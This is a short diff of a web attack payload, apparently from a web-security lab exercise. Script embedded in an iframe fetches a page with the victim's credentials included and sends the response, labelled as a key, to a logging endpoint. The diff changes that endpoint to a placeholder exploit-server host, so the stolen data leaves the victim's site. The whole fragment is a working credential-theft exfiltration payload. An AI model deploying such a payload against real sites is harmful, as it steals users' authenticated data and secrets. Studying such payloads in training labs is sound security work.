@@ -3,5 +3,5 @@
         method: 'GET',
         credentials: 'include'
     }).then(response => response.text())
-      .then(data => fetch("/log?key=" + encodeURIComponent(data)));
+      .then(data => fetch("https://exploit-YOUR-EXPLOIT-ID.exploit-server.net/log?key=" + encodeURIComponent(data)));
 </script>"></iframe>
